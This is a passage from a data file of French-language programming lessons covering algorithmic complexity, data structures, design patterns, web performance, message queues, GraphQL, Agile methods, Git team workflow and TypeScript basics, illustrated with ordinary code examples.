→ "Analyse ce CSV, génère un graphique, envoie-le par email"
→ "Trouve des bugs dans ce repo GitHub et crée des issues"
→ Tout ce qui nécessite plusieurs étapes et des données externes
\`\`\``
      }
    ]
  },
  {
    id: "algorithmes",
    category: "Fondamentaux",
    emoji: "🧮",
    title: "Algorithmes & Structures de données",
    description: "Les bases pour écrire du code efficace",
    level: "Intermédiaire",
    color: "#0EA5E9",
    lessons: [
      {
        id: "complexite",
        title: "Complexité algorithmique (Big O)",
        duration: "13 min",
        content: `# Complexité algorithmique (Big O)

La notation **Big O** décrit comment le temps d'exécution ou la mémoire d'un algorithme évolue quand la taille des données augmente.

## Pourquoi ça compte ?

\`\`\`
Chercher un email dans une liste de 1 000 000 d'utilisateurs :

Algorithme O(n) — recherche linéaire :
→ Parcourt tous les users un par un
→ 1 000 000 comparaisons dans le pire cas
→ 1 seconde sur un vieux PC

Algorithme O(log n) — recherche binaire (si trié) :
→ Divise la liste en 2 à chaque étape
→ log₂(1 000 000) ≈ 20 comparaisons
→ Quasi-instantané

Différence : 1 000 000 vs 20 opérations.
\`\`\`

## Les complexités de la plus rapide à la plus lente

\`\`\`
O(1)       — Constant      : accès à un tableau par index, dictionnaire
O(log n)   — Logarithmique : recherche binaire, arbre binaire équilibré
O(n)       — Linéaire      : parcourir une liste, recherche simple
O(n log n) — Quasi-linéaire: tri rapide (quicksort), mergesort
O(n²)      — Quadratique   : double boucle imbriquée, tri à bulles
O(2ⁿ)      — Exponentiel   : problèmes NP (éviter à tout prix)

Pour n = 1000 :
O(1)       = 1 opération
O(log n)   = ~10 opérations
O(n)       = 1 000 opérations
O(n log n) = ~10 000 opérations
O(n²)      = 1 000 000 opérations     ← 1000x plus lent que O(n)
O(2ⁿ)      = 10^301 opérations        ← impossible
\`\`\`

## Reconnaître la complexité

\`\`\`python
# O(1) — temps constant
def accéder(tableau, index):
    return tableau[index]  # direct, peu importe la taille

def est_vide(dict):
    return len(dict) == 0

# O(n) — une boucle
def somme(tableau):
    total = 0
    for x in tableau:    # parcourt n éléments
        total += x
    return total

# O(n²) — deux boucles imbriquées
def a_des_doublons_naif(tableau):
    for i in range(len(tableau)):
        for j in range(i + 1, len(tableau)):  # boucle dans boucle
            if tableau[i] == tableau[j]:
                return True
    return False

# O(n) — même résultat, bien plus rapide
def a_des_doublons_rapide(tableau):
    return len(tableau) != len(set(tableau))  # set = hashset O(1) lookup
\`\`\`

## Complexité des opérations courantes

\`\`\`
Structure         Accès    Recherche  Insertion  Suppression
───────────       ──────   ─────────  ─────────  ───────────
Array/List        O(1)     O(n)       O(n)       O(n)
Dict/HashMap      O(1)     O(1)       O(1)       O(1)      ← ultra polyvalent
Set               -        O(1)       O(1)       O(1)
Sorted Array      O(1)     O(log n)   O(n)       O(n)
Linked List       O(n)     O(n)       O(1)*      O(1)*
Binary Search Tree O(log n) O(log n)  O(log n)   O(log n)

→ Le dictionnaire (hashmap) est ton meilleur ami pour les perfs
\`\`\``
      },
      {
        id: "structures-donnees",
        title: "Structures de données essentielles",
        duration: "15 min",
        content: `# Structures de données essentielles

## Le tableau (Array / List)

\`\`\`
Mémoire : [10][20][30][40][50]
            0   1   2   3   4   ← indices

Accès par index : O(1) — direct
Recherche : O(n) — doit parcourir
Ajout à la fin : O(1) amorti
Ajout au milieu : O(n) — décale tous les éléments suivants

Utilise pour : collections ordonnées, itération fréquente
\`\`\`

## Le dictionnaire (HashMap)

\`\`\`
{"alice": 25, "bob": 30, "claire": 22}

Comment ça marche :
1. hash("alice") → 4892 → position 4892 % taille_table
2. stocke la valeur à cette position
3. Pour lire : refait le hash → accès direct O(1)

Utilise pour : lookup par clé, comptage, cache, dédoublonnage

Exemples courants :
# Compter les occurrences
compteur = {}
for mot in texte.split():
    compteur[mot] = compteur.get(mot, 0) + 1

# Cache simple (mémoïsation)
cache = {}
def fibonacci(n):
    if n in cache: return cache[n]
    if n <= 1: return n
    cache[n] = fibonacci(n-1) + fibonacci(n-2)
    return cache[n]
\`\`\`

## La pile (Stack) et la file (Queue)

\`\`\`
Stack (LIFO — Last In, First Out) :
[1][2][3] ← push/pop par le haut
Exemples : historique navigateur, undo/redo, appels de fonctions

Queue (FIFO — First In, First Out) :
→ [1][2][3] → sort par la gauche, entre par la droite
Exemples : file d'attente de tâches, BFS, messages

from collections import deque  # queue efficace en Python
file = deque([1, 2, 3])
file.append(4)       # ajoute à droite
file.popleft()       # retire à gauche (O(1))
\`\`\`

## L'arbre binaire de recherche (BST)

\`\`\`
        8
       / \\
      3   10
     / \\    \\
    1   6    14

Règle : gauche < nœud < droite
→ Recherche, insertion, suppression : O(log n)
→ Utilisé dans : bases de données (index B-tree), systèmes de fichiers

Parcours :
In-order (gauche→nœud→droite) : 1, 3, 6, 8, 10, 14 ← trié !
\`\`\`

## Le graphe

\`\`\`
Représente des relations entre objets :
Nœuds (vertices) = entités
Arêtes (edges)   = relations

Exemples :
- Réseau social : utilisateurs + relations
- GPS : villes + routes
- Dépendances npm : packages + imports

Algorithmes fondamentaux :
- BFS (Breadth-First Search) : parcourt couche par couche
  → Trouver le chemin le plus court (non pondéré)
- DFS (Depth-First Search) : va le plus loin possible avant de revenir
  → Détecter les cycles, topological sort
- Dijkstra : chemin le plus court avec poids
  → Navigation GPS
\`\`\``
      }
    ]
  },
  {
    id: "design-patterns",
    category: "Fondamentaux",
    emoji: "🎭",
    title: "Design Patterns",
    description: "Solutions éprouvées aux problèmes récurrents",
    level: "Intermédiaire",
    color: "#F97316",
    lessons: [
      {
        id: "patterns-creational",
        title: "Patterns de création et de structure",
        duration: "14 min",
        content: `# Patterns de création et de structure

Les **design patterns** sont des solutions réutilisables à des problèmes récurrents de conception logicielle.

## Singleton — une seule instance

\`\`\`python
# Problème : on veut exactement une instance d'une classe
# (connexion DB, configuration, logger)

class ConnexionDB:
    _instance = None

    def __new__(cls):
        if cls._instance is None:
            cls._instance = super().__new__(cls)
            cls._instance.connexion = créer_connexion()
        return cls._instance

# Peu importe combien de fois on l'appelle :
db1 = ConnexionDB()
db2 = ConnexionDB()
assert db1 is db2  # True — même instance !
\`\`\`

**Quand l'utiliser** : connexion DB, configuration globale, logger
**Attention** : difficile à tester (état global), à utiliser avec parcimonie

## Factory — déléguer la création

\`\`\`python
# Problème : créer des objets sans spécifier leur classe exacte

class Notification:
    def envoyer(self, message): raise NotImplementedError

class NotificationEmail(Notification):
    def envoyer(self, message):
        print(f"Email : {message}")

class NotificationSMS(Notification):
    def envoyer(self, message):
        print(f"SMS : {message}")

class NotificationPush(Notification):
    def envoyer(self, message):
        print(f"Push : {message}")

# Factory : centralise la logique de création
def créer_notification(type: str) -> Notification:
    mapping = {
        "email": NotificationEmail,
        "sms": NotificationSMS,
        "push": NotificationPush
    }
    if type not in mapping:
        raise ValueError(f"Type inconnu : {type}")
    return mapping[type]()

# Utilisation : le code appelant ne connaît pas les classes concrètes
notif = créer_notification("email")
notif.envoyer("Votre commande est expédiée")
\`\`\`

## Repository — abstraire l'accès aux données

\`\`\`python
# Problème : mélanger la logique métier et les requêtes SQL

# ❌ Sans Repository
class CommandeService:
    async def traiter(self, commande_id):
        # Logique métier mélangée avec SQL !
        result = await db.execute("SELECT * FROM commandes WHERE id = $1", commande_id)
        commande = result.fetchone()
        ...

# ✅ Avec Repository
class CommandeRepository:
    async def trouver_par_id(self, id: int) -> Commande:
        result = await db.execute("SELECT * FROM commandes WHERE id = $1", id)
        return Commande(**result.fetchone())

    async def sauvegarder(self, commande: Commande) -> None:
        await db.execute("INSERT INTO commandes ...", ...)

class CommandeService:
    def __init__(self, repo: CommandeRepository):
        self.repo = repo

    async def traiter(self, commande_id):
        commande = await self.repo.trouver_par_id(commande_id)
        # Logique métier pure, sans SQL
        commande.statut = "traité"
        await self.repo.sauvegarder(commande)
\`\`\`

## Strategy — changer d'algorithme à la volée

\`\`\`python
# Problème : plusieurs algorithmes interchangeables

class CalculateurPrix:
    def __init__(self, stratégie_remise):
        self.stratégie = stratégie_remise

    def calculer(self, prix_base: float) -> float:
        return self.stratégie(prix_base)

# Différentes stratégies
remise_fidélité    = lambda prix: prix * 0.9    # -10%
remise_étudiant    = lambda prix: prix * 0.8    # -20%
sans_remise        = lambda prix: prix           # 0%
remise_black_friday = lambda prix: prix * 0.5   # -50%

# À l'exécution, on choisit la stratégie
calc = CalculateurPrix(remise_étudiant)
print(calc.calculer(100))  # 80.0

calc.stratégie = remise_black_friday  # changer sans modifier la classe
print(calc.calculer(100))  # 50.0
\`\`\``
      },
      {
        id: "patterns-comportementaux",
        title: "Patterns comportementaux",
        duration: "13 min",
        content: `# Patterns comportementaux

## Observer — réagir aux événements

\`\`\`python
# Problème : notifier plusieurs objets quand un état change
# Exemple : quand une commande est passée → notifier email, stock, analytics

class EventBus:
    """Bus d'événements simple"""
    def __init__(self):
        self._listeners = {}  # event → [callbacks]

    def on(self, event: str, callback):
        self._listeners.setdefault(event, []).append(callback)

    def emit(self, event: str, data=None):
        for callback in self._listeners.get(event, []):
            callback(data)

bus = EventBus()

# Abonnements (découplés — chaque service s'abonne indépendamment)
bus.on("commande.créée", lambda c: envoyer_email_confirmation(c))
bus.on("commande.créée", lambda c: décrémenter_stock(c.items))
bus.on("commande.créée", lambda c: analytics.track("purchase", c))
bus.on("commande.payée",  lambda c: déclencher_préparation(c))

# Émission (le créateur de commande ne connaît pas les observateurs)
async def créer_commande(données):
    commande = await repo.sauvegarder(données)
    bus.emit("commande.créée", commande)
    return commande
\`\`\`

## Middleware — chaîne de responsabilité

\`\`\`
Chaque middleware peut :
1. Traiter la requête avant de la passer au suivant
2. Court-circuiter la chaîne (retourner une réponse directement)
3. Modifier la réponse au retour

Requête →[Auth]→[Rate Limit]→[Logging]→[Handler]
         ↑                               ↓
Réponse ←[Auth]←[Rate Limit]←[Logging]←[Handler]

Exemple FastAPI :
@app.middleware("http")
async def log_middleware(request, call_next):
    start = time.time()
    response = await call_next(request)  # ← passe au suivant
    duration = time.time() - start
    print(f"{request.method} {request.url} → {response.status_code} ({duration:.2f}s)")
    return response
\`\`\`

## Dependency Injection — inversion de contrôle

\`\`\`python
# Problème : les classes créent leurs propres dépendances
# → Difficile à tester, couplage fort

# ❌ Sans DI
class UserService:
    def __init__(self):
        self.db = PostgresDB()         # couplé à PostgreSQL !
        self.mailer = SendGridMailer() # couplé à SendGrid !
        self.cache = RedisCache()      # couplé à Redis !

# ✅ Avec DI — les dépendances sont injectées de l'extérieur
class UserService:
    def __init__(self, db: Database, mailer: Mailer, cache: Cache):
        self.db = db
        self.mailer = mailer
        self.cache = cache

# En prod :
service = UserService(
    db=PostgresDB(),
    mailer=SendGridMailer(),
    cache=RedisCache()
)

# En test : injecter des faux (mocks)
service = UserService(
    db=FakeDB(),
    mailer=FakeMailer(),  # pas d'emails envoyés pendant les tests !
    cache=InMemoryCache()
)
\`\`\`

## SOLID : les 5 principes

\`\`\`
S — Single Responsibility : une classe = une seule raison de changer
O — Open/Closed : ouvert à l'extension, fermé à la modification
L — Liskov Substitution : les sous-classes doivent remplacer les classes parentes
I — Interface Segregation : mieux vaut plusieurs petites interfaces qu'une grosse
D — Dependency Inversion : dépendre des abstractions, pas des implémentations

Résumé pratique :
→ Petites classes avec un seul rôle
→ Ajouter des fonctionnalités sans modifier l'existant (Strategy, Plugin)
→ Injecter les dépendances (DI)
→ Tester avec des interfaces (pas des classes concrètes)
\`\`\``
      }
    ]
  },
  {
    id: "performance-web",
    category: "Frontend",
    emoji: "⚡",
    title: "Performance Web",
    description: "Rendre son application rapide et fluide",
    level: "Intermédiaire",
    color: "#EAB308",
    lessons: [
      {
        id: "core-web-vitals",
        title: "Core Web Vitals et métriques",
        duration: "12 min",
        content: `# Core Web Vitals et métriques

Google mesure 3 métriques clés qui impactent le SEO et l'expérience utilisateur.

## Les 3 métriques essentielles

\`\`\`
LCP — Largest Contentful Paint
→ Temps d'affichage du plus grand élément visible
→ Objectif : < 2.5 secondes
→ Typiquement : image hero, titre principal

FID / INP — Interaction to Next Paint
→ Réactivité aux interactions utilisateur (clic, touche clavier)
→ Objectif : < 200 ms
→ Causé par : JavaScript qui bloque le thread principal

CLS — Cumulative Layout Shift
→ Stabilité visuelle (est-ce que la page "saute" ?)
→ Objectif : < 0.1
→ Causé par : images sans dimensions, polices qui se chargent

Comment mesurer :
→ Chrome DevTools (onglet Performance, Lighthouse)
→ PageSpeed Insights (pagespeed.web.dev)
→ Web Vitals extension Chrome
\`\`\`

## Optimiser le chargement initial

\`\`\`
1. Réduire la taille des fichiers
   → Minifier JS/CSS (Vite/Webpack le fait automatiquement)
   → Compression gzip/brotli sur le serveur
   → Images : WebP/AVIF au lieu de PNG/JPEG (50-80% plus léger)
   → Lazy loading : charger images/composants à la demande

2. Réduire les requêtes
   → Bundling : regrouper les fichiers JS
   → HTTP/2 : multiplexe les requêtes
   → CDN : servir les assets depuis un serveur proche de l'utilisateur

3. Prioriser ce qui est visible (above the fold)
   → CSS critique inline dans le <head>
   → Précharger les ressources importantes :
     <link rel="preload" href="hero.jpg" as="image">
     <link rel="preconnect" href="https://fonts.googleapis.com">
\`\`\`

## Code Splitting : ne charger que ce qui est nécessaire

\`\`\`javascript
// ❌ Tout dans un seul bundle (2MB chargés au départ)
import { AdminPanel } from './AdminPanel'
import { Dashboard } from './Dashboard'
import { Settings } from './Settings'

// ✅ Chargement à la demande (lazy loading)
import { lazy, Suspense } from 'react'

const AdminPanel = lazy(() => import('./AdminPanel'))
const Dashboard  = lazy(() => import('./Dashboard'))
const Settings   = lazy(() => import('./Settings'))

// Dans ton composant :
<Suspense fallback={<Spinner />}>
  <AdminPanel />
</Suspense>
// AdminPanel.js ne sera téléchargé que quand ce composant est rendu
\`\`\`

## Optimiser les images

\`\`\`html
<!-- Toujours spécifier width/height pour éviter le CLS -->
<img src="hero.jpg" width="800" height="400" alt="...">

<!-- Lazy loading natif -->
<img src="photo.jpg" loading="lazy" alt="...">

<!-- Images responsive (servir la bonne taille selon l'écran) -->
<picture>
  <source media="(max-width: 768px)" srcset="hero-mobile.webp" type="image/webp">
  <source srcset="hero-desktop.webp" type="image/webp">
  <img src="hero-desktop.jpg" alt="...">
</picture>
\`\`\``
      },
      {
        id: "optimisation-backend",
        title: "Optimisation backend et DB",
        duration: "13 min",
        content: `# Optimisation backend et DB

## Le N+1 Problem : l'ennemi caché

\`\`\`python
# ❌ Le problème : 1 requête pour les posts + 1 par post pour l'auteur
posts = await db.execute("SELECT * FROM posts")  # 1 requête

for post in posts:
    auteur = await db.execute(
        "SELECT * FROM users WHERE id = $1", post.user_id
    )  # 1 requête PAR POST !
# Si 100 posts → 101 requêtes SQL !

# ✅ La solution : JOIN en une seule requête
posts_avec_auteurs = await db.execute("""
    SELECT posts.*, users.nom, users.avatar
    FROM posts
    JOIN users ON posts.user_id = users.id
    ORDER BY posts.créé_le DESC
    LIMIT 20
""")
# 1 seule requête, peu importe le nombre de posts
\`\`\`

## Pagination : ne jamais charger tout

\`\`\`python
# ❌ Charger toutes les données
tous_les_articles = await db.execute("SELECT * FROM articles")
# 1 million d'articles → timeout, crash mémoire

# ✅ Cursor-based pagination (recommandée)
# Avantage : stable si nouvelles données insérées
async def paginer(cursor_id: int = None, limite: int = 20):
    if cursor_id:
        return await db.execute("""
            SELECT * FROM articles
            WHERE id < $1
            ORDER BY id DESC
            LIMIT $2
        """, cursor_id, limite)
    else:
        return await db.execute("""
            SELECT * FROM articles
            ORDER BY id DESC
            LIMIT $1
        """, limite)

# ✅ Offset pagination (simple mais moins stable)
async def paginer_offset(page: int = 1, limite: int = 20):
    offset = (page - 1) * limite
    return await db.execute(
        "SELECT * FROM articles ORDER BY id DESC LIMIT $1 OFFSET $2",
        limite, offset
    )
\`\`\`

## Connection Pooling : réutiliser les connexions

\`\`\`
Sans pool :
Chaque requête → ouvrir connexion DB (~100ms) → requête → fermer
100 req/sec → 100 connexions ouvertes/fermées/sec → surcharge

Avec pool :
Démarrage → ouvrir 10-20 connexions → garder en vie
Requête → prendre connexion disponible → rendre après utilisation
100 req/sec → max 20 connexions actives → très efficace

Configuration optimale :
pool_size = nombre de workers * 2-4
max_overflow = pool_size * 0.5
pool_timeout = 30 secondes

asyncpg (Python async) :
DATABASE_URL = "postgresql+asyncpg://..."
engine = create_async_engine(
    DATABASE_URL,
    pool_size=10,
    max_overflow=5
)
\`\`\`

## Requêtes lentes : les détecter et les corriger

\`\`\`sql
-- PostgreSQL : trouver les requêtes lentes (activer slow query log)
-- Ou utiliser EXPLAIN ANALYZE

EXPLAIN ANALYZE
SELECT * FROM commandes
WHERE statut = 'en_attente'
ORDER BY créé_le DESC;

-- Si tu vois "Seq Scan" sur une grande table → créer un index !
-- "Index Scan" = bien
-- "Seq Scan" sur 100 000+ lignes = problème

-- Créer l'index manquant
CREATE INDEX idx_commandes_statut_date ON commandes(statut, créé_le DESC);

-- Relancer → maintenant "Index Scan" → bien plus rapide
\`\`\``
      }
    ]
  },
  {
    id: "message-queues",
    category: "Backend",
    emoji: "📬",
    title: "Files de Messages",
    description: "Découpler et scaler avec les message queues",
    level: "Avancé",
    color: "#FF6B35",
    lessons: [
      {
        id: "queues-concepts",
        title: "Pourquoi et comment utiliser les queues",
        duration: "14 min",
        content: `# Files de messages (Message Queues)

Une **message queue** est un tampon qui permet à des services de communiquer de façon **asynchrone** et **découplée**.

## Le problème qu'elles résolvent

\`\`\`
Sans queue (appel synchrone) :
Utilisateur → POST /commande → Serveur → envoie email → génère facture → met à jour stock → répond
Durée totale : 2-3 secondes (l'utilisateur attend tout !)
Si le service email est down → la commande échoue !

Avec queue (asynchrone) :
Utilisateur → POST /commande → Serveur → sauvegarde commande → répond immédiatement (50ms)
                                          ↓ (en arrière-plan)
                                     [Queue] ← messages publiés
                                          ↓
                                  Workers lisent et traitent :
                                  - Worker Email → envoie email
                                  - Worker Facture → génère PDF
                                  - Worker Stock → décrémente
\`\`\`

## Les avantages

\`\`\`
1. Découplage
   Producteur et consommateur ne se connaissent pas
   → Ajouter un nouveau worker sans toucher le producteur

2. Résilience
   Si le service email est down → le message reste dans la queue
   → Sera traité quand le service redémarre

3. Absorber les pics de charge
   1000 commandes en 1 minute → queue les absorbe
   5 workers traitent à leur rythme
   → Pas d'overload, pas de crash

4. Retry automatique
   Traitement échoué → le message revient dans la queue
   → Réessaie X fois avant de mettre en dead letter queue
\`\`\`

## Les outils

\`\`\`
Redis (via Bull/BullMQ ou rq) :
→ Simple, déjà souvent dans le stack
→ Parfait pour les tâches simples (jobs, emails, webhooks)
→ Pas de durabilité parfaite (données en RAM)

RabbitMQ :
→ Protocole AMQP, très fiable
→ Routing complexe (exchanges, bindings)
→ Bon pour les microservices

Apache Kafka :
→ Log distribué haute performance
→ Millions de messages/seconde
→ Rétention longue (rejouer les événements)
→ Overkill pour une startup, indispensable à grande échelle

Celery (Python) + Redis/RabbitMQ :
→ Le plus populaire en Python
→ Scheduling, retry, chaînes de tâches
\`\`\`

## Exemple avec Celery

\`\`\`python
# pip install celery redis

# tasks.py
from celery import Celery

app = Celery("nexus", broker="redis://localhost:6379/0")

@app.task(
    bind=True,
    max_retries=3,          # réessaie 3 fois si erreur
    default_retry_delay=60  # attendre 60s entre les essais
)
def envoyer_email_bienvenue(self, user_id: int):
    try:
        user = User.get(user_id)
        mailer.send(
            to=user.email,
            subject="Bienvenue sur Nexus !",
            template="bienvenue"
        )
    except Exception as exc:
        raise self.retry(exc=exc)  # remet dans la queue

@app.task
def générer_rapport_pdf(commande_id: int):
    commande = Commande.get(commande_id)
    pdf = générer_pdf(commande)
    s3.upload(pdf, f"factures/{commande_id}.pdf")
    commande.facture_url = s3.url(f"factures/{commande_id}.pdf")
    commande.save()

# Dans l'API FastAPI :
@router.post("/commandes")
async def créer_commande(données: CommandeCreate):
    commande = await repo.créer(données)

    # Lancer les tâches en arrière-plan (non bloquant)
    envoyer_email_bienvenue.delay(commande.user_id)
    générer_rapport_pdf.delay(commande.id)

    return commande  # répond immédiatement, sans attendre les tâches

# Lancer le worker :
# celery -A tasks worker --loglevel=info
\`\`\``
      }
    ]
  },
  {
    id: "graphql",
    category: "Backend",
    emoji: "🔷",
    title: "GraphQL",
    description: "Requêtes flexibles et typées pour tes APIs",
    level: "Intermédiaire",
    color: "#E535AB",
    lessons: [
      {
        id: "graphql-concepts",
        title: "GraphQL vs REST : concepts et différences",
        duration: "14 min",
        content: `# GraphQL vs REST

## Le problème que GraphQL résout

\`\`\`
Avec REST, pour afficher un profil utilisateur avec ses 3 derniers posts :

Requête 1 : GET /api/users/42
→ { id, nom, email, avatar, bio, créé_le, role, ... } ← overfetching (trop de données)

Requête 2 : GET /api/users/42/posts?limit=3
→ [{ id, titre, contenu, auteur_id, créé_le, ... }] ← overfetching encore

Total : 2 requêtes réseau, données superflues

Avec GraphQL, une seule requête :
query {
  utilisateur(id: 42) {
    nom        ← exactement ce dont on a besoin
    avatar
    posts(limit: 3) {
      titre
      créé_le
    }
  }
}
→ 1 requête, exactement les données demandées
\`\`\`

## Les 3 opérations GraphQL

\`\`\`graphql
# 1. Query — lire des données
query ObtenirUtilisateur {
  utilisateur(id: 42) {
    id
    nom
    email
    posts {
      titre
      tags { nom }
    }
  }
}

# 2. Mutation — modifier des données
mutation CréerArticle {
  créerArticle(input: {
    titre: "Mon article"
    contenu: "Contenu..."
    tags: ["javascript", "react"]
  }) {
    id
    titre
    créé_le
  }
}

# 3. Subscription — écouter les changements en temps réel
subscription NouveauxMessages {
  messageCréé(channelId: "123") {
    id
    contenu
    auteur { nom avatar }
  }
}
\`\`\`

## Le schéma : contrat entre frontend et backend

\`\`\`graphql
# schema.graphql — définit tous les types disponibles

type Utilisateur {
  id: ID!                    # ! = non nullable
  nom: String!
  email: String!
  avatar: String
  posts: [Article!]!         # liste d'articles non nullable
  créé_le: DateTime!
}

type Article {
  id: ID!
  titre: String!
  contenu: String!
  auteur: Utilisateur!
  tags: [Tag!]!
  publié: Boolean!
}

# Point d'entrée pour les lectures
type Query {
  utilisateur(id: ID!): Utilisateur
  articles(limit: Int = 10, offset: Int = 0): [Article!]!
}

# Point d'entrée pour les modifications
type Mutation {
  créerArticle(input: ArticleInput!): Article!
  supprimerArticle(id: ID!): Boolean!
}

input ArticleInput {
  titre: String!
  contenu: String!
  tags: [String!]
}
\`\`\`

## Quand choisir GraphQL vs REST ?

\`\`\`
Choisir REST si :
→ API simple avec peu d'endpoints
→ Équipe peu familière avec GraphQL
→ Cache HTTP important (GraphQL = tout via POST)
→ API publique (REST plus universel)

Choisir GraphQL si :
→ Plusieurs clients avec des besoins différents (mobile, web, desktop)
→ Données très imbriquées et liées
→ Frontend fait beaucoup de requêtes pour assembler les données
→ Évolution fréquente des besoins frontend

La réalité : la plupart des apps marchent très bien avec REST bien conçu.
GraphQL brille vraiment dans les grandes plateformes (GitHub, Shopify, Twitter/X).
\`\`\``
      }
    ]
  },
  {
    id: "gestion-projet",
    category: "Fondamentaux",
    emoji: "📋",
    title: "Gestion de Projet Dev",
    description: "Agile, Scrum, Kanban et collaboration en équipe",
    level: "Débutant",
    color: "#14B8A6",
    lessons: [
      {
        id: "agile-scrum",
        title: "Agile, Scrum et Kanban",
        duration: "13 min",
        content: `# Agile, Scrum et Kanban

## Le problème avec le développement en cascade (Waterfall)

\`\`\`
Waterfall (modèle en cascade) :
Analyse (2 mois) → Design (2 mois) → Dev (6 mois) → Test (2 mois) → Déploiement
                                                                           ↑
                              On découvre que les besoins ont changé ici, 12 mois plus tard

Problèmes :
- Feedback très tardif (12 mois pour voir quelque chose)
- Changements très coûteux en fin de projet
- Les vraies priorités changent pendant le projet
\`\`\`

## Agile : les 4 valeurs fondamentales

\`\`\`
1. Individus et interactions  >  processus et outils
2. Logiciel fonctionnel       >  documentation exhaustive
3. Collaboration client       >  négociation contractuelle
4. Adaptation au changement   >  suivi d'un plan

En pratique :
→ Livraisons fréquentes (toutes les 1-2 semaines)
→ Feedback rapide des utilisateurs
→ Priorisation continue des fonctionnalités
→ Équipes autonomes et pluridisciplinaires
\`\`\`

## Scrum : le framework le plus populaire

\`\`\`
Rôles :
Product Owner (PO)  → priorise les fonctionnalités, parle aux stakeholders
Scrum Master        → facilite le processus, enlève les obstacles
Dev Team            → développe le produit

Artefacts :
Product Backlog     → liste de toutes les fonctionnalités souhaitées (priorisée)
Sprint Backlog      → ce qu'on s'engage à faire ce sprint
Increment           → version fonctionnelle livrée à la fin du sprint

Cérémonies (Sprint = 1-2 semaines) :
Sprint Planning     → choisir ce qu'on fait ce sprint (~2h)
Daily Standup       → 15 min chaque matin :
                      "Qu'est-ce que j'ai fait hier ?"
                      "Qu'est-ce que je fais aujourd'hui ?"
                      "Quels obstacles ai-je ?"
Sprint Review       → démontrer ce qui a été fait aux stakeholders (~1h)
Rétrospective       → "Qu'est-ce qui s'est bien passé ? Qu'améliorer ?" (~1h)
\`\`\`

## Kanban : visualiser le flux

\`\`\`
Tableau Kanban :
┌─────────────┬──────────────┬──────────────┬──────────────┐
│  À faire    │  En cours    │  En review   │  Terminé     │
│  (Backlog)  │  (WIP: max 3)│              │              │
├─────────────┼──────────────┼──────────────┼──────────────┤
│  Feature A  │  Feature C   │  Feature E   │  Feature F   │
│  Bug fix 1  │  Bug fix 2   │              │  Feature G   │
│  Feature B  │  Feature D   │              │              │
└─────────────┴──────────────┴──────────────┴──────────────┘

WIP Limit (Work In Progress) :
→ Limiter le nombre de tâches simultanées
→ Evite le context-switching
→ Identifie les goulots d'étranglement (colonne saturée)

Kanban vs Scrum :
→ Kanban : flux continu, pas de sprints, flexible
→ Scrum : itérations fixes, cérémonies structurées
→ Kanban pour la maintenance/support, Scrum pour le développement produit
\`\`\`

## User Stories et estimation

\`\`\`
Format User Story :
"En tant que [utilisateur], je veux [action], afin de [bénéfice]"

Exemple :
"En tant qu'utilisateur, je veux réinitialiser mon mot de passe par email,
afin de retrouver l'accès à mon compte si je l'oublie."

Critères d'acceptation (Definition of Done) :
✓ Formulaire de saisie d'email
✓ Email envoyé avec lien valide 24h
✓ Nouveau mot de passe mis à jour
✓ Connexion possible avec le nouveau mot de passe
✓ Tests unitaires et d'intégration

Estimation en Story Points (Fibonacci) :
1 = trivial, quelques minutes
2 = simple, quelques heures
3 = moyen, 1 jour
5 = complexe, 2-3 jours
8 = très complexe, découper en sous-tâches
\`\`\``
      },
      {
        id: "git-workflow-equipe",
        title: "Git en équipe : branches et code review",
        duration: "12 min",
        content: `# Git en équipe

## Git Flow vs Trunk-Based Development

\`\`\`
Git Flow (traditionnel) :
main         ──────────────────────────────────────────► production
develop      ─────────────────────────────────────────► intégration
feature/xxx  ────────────╮
feature/yyy          ────╯ merge dans develop
release/1.2              ─────────╮ test → merge dans main
hotfix/bug                        ───► correction urgente prod

Trunk-Based Development (moderne, recommandé) :
main         ──────────────────────────────────────────► production
feature/xxx  ──╮ (max 1-2 jours de vie)
feature/yyy    ╯ merge rapidement dans main
→ Petites PR, intégration continue, feature flags
\`\`\`

## Le cycle d'une Pull Request

\`\`\`
1. Créer une branche depuis main
   git checkout -b feature/authentification-google

2. Développer avec des commits clairs
   git commit -m "Add Google OAuth2 redirect endpoint"
   git commit -m "Store OAuth tokens in session"
   git commit -m "Add logout for OAuth users"

3. Pousser et créer la PR sur GitHub
   git push origin feature/authentification-google
   → "New Pull Request" sur GitHub

4. Description de la PR :
   - Ce que ça fait
   - Comment tester
   - Screenshots si UI
   - Issues liées (#42)

5. Code Review :
   - 1-2 reviewers minimum
   - Vérifier : logique, sécurité, tests, lisibilité

6. Approbation + merge dans main

7. Supprimer la branche (elle a servi)
\`\`\`

## Faire une bonne code review

\`\`\`
Ce qu'on vérifie :
✓ La logique est-elle correcte ?
✓ Les cas d'erreur sont-ils gérés ?
✓ Y a-t-il des problèmes de sécurité ? (injection, auth)
✓ Les performances sont-elles acceptables ?
✓ Le code est-il lisible et maintenable ?
✓ Les tests couvrent-ils les cas importants ?

Comment donner du feedback :
✅ "Cette fonction fait trop de choses, je suggère de la découper en..."
✅ "Question : pourquoi utiliser X ici plutôt que Y ?"
✅ "Nit: nom de variable ambigu, 'data' → 'utilisateurs' serait plus clair"
❌ "Ce code est nul"
❌ "Pourquoi tu as fait ça ??" (ton agressif)

Labels utiles :
[blocking]   → doit être corrigé avant merge
[suggestion] → amélioration optionnelle
[question]   → demande de clarification
[nit]        → détail mineur, style
\`\`\`

## Conventional Commits : messages standardisés

\`\`\`
Format : type(scope): description

Types :
feat     → nouvelle fonctionnalité
fix      → correction de bug
docs     → documentation
style    → formatage (pas de changement logique)
refactor → refactoring (ni feature ni fix)
test     → ajout/modification de tests
chore    → tâches de maintenance (CI, deps)
perf     → amélioration de performance

Exemples :
feat(auth): add Google OAuth2 login
fix(api): handle null user_id in /profile endpoint
docs(readme): add deployment instructions
refactor(db): extract repository pattern for users
test(auth): add integration tests for JWT expiration

Avantage : génération automatique du CHANGELOG, semantic versioning
\`\`\``
      }
    ]
  },
  {
    id: "typescript",
    category: "Frontend",
    emoji: "🔷",
    title: "TypeScript",
    description: "JavaScript avec des types pour plus de robustesse",
    level: "Intermédiaire",
    color: "#3178C6",
    lessons: [
      {
        id: "typescript-pourquoi",
        title: "Pourquoi TypeScript et comment ça marche",
        duration: "12 min",
        content: `# Pourquoi TypeScript ?

TypeScript est un **superset de JavaScript** qui ajoute un système de types statiques. Il se compile en JavaScript standard.

## Le problème que TypeScript résout

\`\`\`javascript
// JavaScript : erreur découverte à l'exécution (en production !)
function calculerTotal(commande) {
  return commande.items.reduce((sum, item) => sum + item.prix * item.quantite, 0);
}

calculerTotal(null);        // 💥 TypeError: Cannot read properties of null
calculerTotal({ items: [{ prix: "10" }] });  // 💥 "100" au lieu de 100 (string * number)
\`\`\`

